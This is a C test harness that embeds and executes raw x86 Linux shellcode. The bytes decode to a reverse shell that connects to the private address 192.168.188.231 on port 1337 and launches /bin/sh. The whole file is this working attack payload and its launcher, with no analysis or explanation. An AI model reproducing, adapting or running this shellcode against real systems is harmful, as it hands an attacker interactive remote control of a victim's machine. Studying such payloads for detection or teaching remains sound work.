#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\xb0\x66\x53\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68\xc0\xa8\xbc\xe7\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\xb3\x03\x89\xe1\xcd\x80\x31\xc0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";





main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
